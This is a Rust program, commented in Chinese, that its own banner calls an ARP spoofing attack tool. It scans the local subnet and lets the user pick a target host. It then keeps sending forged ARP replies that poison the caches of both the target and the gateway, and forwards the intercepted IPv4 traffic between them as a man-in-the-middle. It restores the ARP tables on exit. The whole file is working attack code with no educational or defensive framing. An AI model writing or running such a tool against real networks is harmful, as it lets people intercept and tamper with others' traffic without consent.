use pnet::datalink::{self, Channel, NetworkInterface, DataLinkReceiver, DataLinkSender};
use pnet::packet::arp::{
    ArpOperation, ArpPacket, MutableArpPacket, 
    ArpHardwareTypes, ArpOperations
};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::util::MacAddr;

use ipnetwork::IpNetwork;
use local_ip_address::local_ip;

use std::io::{self, Write};
use std::net::{Ipv4Addr, IpAddr};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::thread;
use std::time::{Duration, Instant};

// 常量定义
const ETHERNET_HEADER_LEN: usize = 14;
const ARP_PACKET_LEN: usize = 28;
const MIN_BUFFER_SIZE: usize = ETHERNET_HEADER_LEN + ARP_PACKET_LEN;

// 辅助函数
fn send_arp_packet(
    tx: &mut Box<dyn DataLinkSender>, 
    interface_mac: MacAddr, 
    src_ip: Ipv4Addr,       
    src_mac: MacAddr,       
    target_ip: Ipv4Addr,    
    target_mac: MacAddr,    
    op: ArpOperation,
) -> Result<(), std::io::Error> {
    let mut buf = [0u8; MIN_BUFFER_SIZE];
    {
        let mut arp = MutableArpPacket::new(&mut buf[ETHERNET_HEADER_LEN..]).unwrap();
        // 使用 ArpHardwareTypes::Ethernet
        arp.set_hardware_type(ArpHardwareTypes::Ethernet); 
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4); 
        arp.set_operation(op);
        arp.set_sender_hw_addr(src_mac);
        arp.set_sender_proto_addr(src_ip);
        arp.set_target_hw_addr(target_mac);
        arp.set_target_proto_addr(target_ip);
    }
    {
        let mut eth = MutableEthernetPacket::new(&mut buf).unwrap();
        eth.set_destination(target_mac);
        eth.set_source(interface_mac);
        eth.set_ethertype(EtherTypes::Arp);
    }
    tx.send_to(&buf, None).unwrap();
    Ok(())
}

fn get_mac(
    interface: &NetworkInterface,
    tx_mutex: Arc<Mutex<Box<dyn DataLinkSender>>>, 
    rx_mutex: Arc<Mutex<Box<dyn DataLinkReceiver>>>, 
    my_ip: Ipv4Addr,
    my_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> Option<MacAddr> {
    for _ in 0..3 {
        if let Some(mac) = arp_ping(
            interface, 
            tx_mutex.clone(), 
            rx_mutex.clone(), 
            my_ip, my_mac, target_ip, Duration::from_secs(1)) {
            return Some(mac);
        }
    }
    None
}

fn arp_ping(
    _interface: &NetworkInterface,
    tx_mutex: Arc<Mutex<Box<dyn DataLinkSender>>>, 
    rx_mutex: Arc<Mutex<Box<dyn DataLinkReceiver>>>, 
    my_ip: Ipv4Addr,
    my_mac: MacAddr,
    target_ip: Ipv4Addr,
    timeout: Duration,
) -> Option<MacAddr> {
    
    // 发送 ARP Request
    {
        let mut tx_lock = tx_mutex.lock().unwrap();
        let _ = send_arp_packet(
            &mut *tx_lock, 
            my_mac,
            my_ip,
            my_mac,
            target_ip,
            MacAddr::broadcast(),
            // 使用 ArpOperations::Request
            ArpOperations::Request, 
        );
    }

    // 接收 ARP Reply
    let start = Instant::now();
    while start.elapsed() < timeout {
        
        let mut rx_lock = rx_mutex.lock().unwrap();
        if let Ok(frame) = rx_lock.next() { 
            if frame.len() >= MIN_BUFFER_SIZE {
                if let Some(eth) = EthernetPacket::new(frame) {
                    if eth.get_ethertype() == EtherTypes::Arp {
                        if let Some(arp) = ArpPacket::new(&frame[ETHERNET_HEADER_LEN..]) {
                            // 使用 ArpOperations::Reply
                            if arp.get_operation() == ArpOperations::Reply 
                                && arp.get_sender_proto_addr() == target_ip
                            {
                                return Some(arp.get_sender_hw_addr());
                            }
                        }
                    }
                }
            }
        }
    }
    None
}

// 核心主函数
fn main() {
    println!("=== ARP 欺骗攻击工具 ===\n");

    let interfaces = datalink::interfaces();
    for (i, iface) in interfaces.iter().enumerate() {
        println!(
            "[{}] {}  MAC: {:?}  IPs: {:?}",
            i, iface.name, iface.mac, iface.ips
        );
    }

    print!("\n请选择要使用的接口编号: ");
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    let idx: usize = input.trim().parse().unwrap_or(0);
    let interface = interfaces.get(idx).expect("接口编号无效");
    let my_mac = interface.mac.expect("该接口无 MAC 地址");
    let my_ip = match local_ip().unwrap() {
        std::net::IpAddr::V4(ip) => ip,
        _ => panic!("未检测到 IPv4 地址"),
    };

    println!(
        "\n使用接口: {}  MAC: {}  IP: {}\n",
        interface.name, my_mac, my_ip
    );

    // 创建主通道
    let (tx_raw, rx_raw) = match datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("不支持的通道类型"),
        Err(e) => panic!("打开通道失败: {}", e),
    };
    
    // 使用 Arc<Mutex> 包装，实现安全共享
    let tx_main = Arc::new(Mutex::new(tx_raw));
    let rx_main = Arc::new(Mutex::new(rx_raw));

    let subnet = interface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .expect("未找到 IPv4 网段");
    
    let cidr_v4 = match subnet.ip() {
        IpAddr::V4(ip) => ip,
        _ => panic!("只支持 IPv4 网段进行扫描"),
    };

    let prefix = match subnet {
        IpNetwork::V4(net) => net.prefix(),
        _ => 24,
    };
    let mask = (0xFFFFFFFFu32) << (32 - prefix);
    let base = u32::from(cidr_v4) & mask; 
    let gateway_ip = Ipv4Addr::from(base + 1);
    println!("猜测网关地址: {}\n", gateway_ip);

    // 扫描局域网
    println!("开始扫描局域网中的在线主机 (串行)...");
    let start = Instant::now();
    let ips: Vec<Ipv4Addr> = (1..255)
        .map(|i| Ipv4Addr::from(base + i))
        .collect();

    let tx_for_scan = tx_main.clone(); 
    let rx_for_scan = rx_main.clone(); 
    
    let active_hosts: Vec<(Ipv4Addr, MacAddr)> = ips
        .iter()
        .filter_map(|&ip| {
            if ip == my_ip { return None; }
            
            arp_ping(
                interface, 
                tx_for_scan.clone(), 
                rx_for_scan.clone(), 
                my_ip, my_mac, ip, 
                Duration::from_millis(100)
            ).map(|mac| (ip, mac))
        })
        .collect();

    println!(
        "扫描完成，用时 {:.2}s，发现 {} 台设备。\n",
        start.elapsed().as_secs_f32(),
        active_hosts.len()
    );
    for (i, (ip, mac)) in active_hosts.iter().enumerate() {
        println!("[{:02}] {:<15}  {}", i, ip, mac);
    }

    // 用户选择目标并获取 MAC
    print!("\n请输入目标主机编号或 IP: ");
    io::stdout().flush().unwrap();
    input.clear();
    io::stdin().read_line(&mut input).unwrap();
    let input_trim = input.trim();

    let target_ip: Ipv4Addr;
    if let Ok(i) = input_trim.parse::<usize>() {
        target_ip = active_hosts.get(i).map(|x| x.0).unwrap_or(gateway_ip);
    } else {
        target_ip = input_trim.parse::<Ipv4Addr>().unwrap_or(gateway_ip);
    };

    println!("\n目标 IP: {}", target_ip);

    let target_mac = get_mac(
        interface, 
        tx_main.clone(), 
        rx_main.clone(), 
        my_ip, my_mac, 
        target_ip
    ).expect("无法获取目标 MAC");

    let gateway_mac = get_mac(
        interface, 
        tx_main.clone(), 
        rx_main.clone(), 
        my_ip, my_mac, 
        gateway_ip
    ).expect("无法获取网关 MAC");

    println!(
        "获取完毕：\n - 目标 {} → {}\n - 网关 {} → {}\n",
        target_ip, target_mac, gateway_ip, gateway_mac
    );

    // 进入欺骗和转发环节
    let running = Arc::new(AtomicBool::new(true));
    let r_send = running.clone();
    let r_fwd = running.clone();
    let r_main = running.clone();

    println!("开始 ARP 欺骗攻击... 按 Ctrl+C 停止。\n");

    // 欺骗发送线程
    let tx_poison = tx_main.clone(); 
    let sender_handle = thread::spawn(move || {
        while r_send.load(Ordering::SeqCst) {
            
            let mut tx_lock = tx_poison.lock().unwrap();
            
            // 发送欺骗包 1
            // 使用 ArpOperations::Reply
            let _ = send_arp_packet(
                &mut *tx_lock, my_mac, gateway_ip, my_mac, target_ip, target_mac, ArpOperations::Reply, 
            );
            // 发送欺骗包 2
            // 使用 ArpOperations::Reply
            let _ = send_arp_packet(
                &mut *tx_lock, my_mac, target_ip, my_mac, gateway_ip, gateway_mac, ArpOperations::Reply, 
            );
            
            drop(tx_lock); 
            thread::sleep(Duration::from_secs(2)); 
        }
    });

    // 流量捕获和转发线程
    let my_mac_fwd = my_mac;
    let target_ip_fwd = target_ip;
    let target_mac_fwd = target_mac;
    let gateway_ip_fwd = gateway_ip;
    let gateway_mac_fwd = gateway_mac;

    let tx_fwd = tx_main.clone(); 
    let forwarder_handle = thread::spawn(move || {
        println!("[转发线程] 正在监听并转发数据包...");
        
        // 注意：在主线程创建的 rx_main Arc<Mutex> 被移到此线程并保持锁定，
        // 以便独占接收网络数据包。
        let mut rx_lock = rx_main.lock().unwrap(); 
        
        while r_fwd.load(Ordering::SeqCst) {
            match rx_lock.next() {
                Ok(frame) => {
                    let mut packet_buffer = frame.to_vec();

                    // 拆分以太网头和IPv4负载部分
                    if packet_buffer.len() <= ETHERNET_HEADER_LEN {
                        continue;
                    }

                    let (eth_slice, ipv4_slice) = packet_buffer.split_at_mut(ETHERNET_HEADER_LEN);

                    if let Some(mut eth_packet) = MutableEthernetPacket::new(eth_slice) {
                        if eth_packet.get_destination() == my_mac_fwd {
                            if eth_packet.get_ethertype() == EtherTypes::Ipv4 {
                                if let Some(mut ipv4_packet) = MutableIpv4Packet::new(ipv4_slice) {
                                    let src_ip = ipv4_packet.get_source();
                                    let dst_ip = ipv4_packet.get_destination();

                                    let new_dst_mac = if src_ip == target_ip_fwd && dst_ip == gateway_ip_fwd {
                                        gateway_mac_fwd
                                    } else if src_ip == gateway_ip_fwd && dst_ip == target_ip_fwd {
                                        target_mac_fwd
                                    } else {
                                        continue;
                                    };

                                    eth_packet.set_source(my_mac_fwd);
                                    eth_packet.set_destination(new_dst_mac);

                                    // 重新计算 IPv4 校验和（避免设备丢包）
                                    ipv4_packet.set_checksum(0);
                                    let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
                                    ipv4_packet.set_checksum(checksum);

                                    // 获取发送锁并转发
                                    if let Ok(mut tx_lock) = tx_fwd.lock() {
                                        let _ = tx_lock.send_to(&packet_buffer, None);
                                    }
                                }
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }
    });

    // 主线程等待 Ctrl+C 信号
    ctrlc::set_handler(move || {
        println!("\n[主线程] 接收到 Ctrl+C，正在终止攻击...");
        r_main.store(false, Ordering::SeqCst);
    }).unwrap();

    // 等待子线程结束
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(100));
    }
    
    let _ = sender_handle.join();
    let _ = forwarder_handle.join(); 

    // ARP 恢复机制
    println!("\n攻击结束，恢复 ARP 表...");
    
    // 重新打开一个独立的发送通道用于恢复
    let (mut tx_recover, _) = match datalink::channel(interface, Default::default()).unwrap() {
        Channel::Ethernet(tx, rx) => (tx, rx),
        _ => panic!("恢复通道创建失败"),
    };

    for _ in 0..5 { 
        // 恢复目标机
        // 使用 ArpOperations::Reply
        let _ = send_arp_packet(
            &mut tx_recover, my_mac, gateway_ip, gateway_mac, target_ip, target_mac, ArpOperations::Reply, 
        );
        // 恢复网关
        // 使用 ArpOperations::Reply
        let _ = send_arp_packet(
            &mut tx_recover, my_mac, target_ip, target_mac, gateway_ip, gateway_mac, ArpOperations::Reply, 
        );
        thread::sleep(Duration::from_millis(50));
    }
    
    println!("ARP 已恢复。程序退出。");
    
    print!("\n--- 按 Enter 键退出程序 ---");
    io::stdout().flush().unwrap(); // 确保提示信息立即显示
    
    // 阻塞程序，等待用户按回车键
    let mut exit_buffer = String::new();
    let _ = io::stdin().read_line(&mut exit_buffer);
}
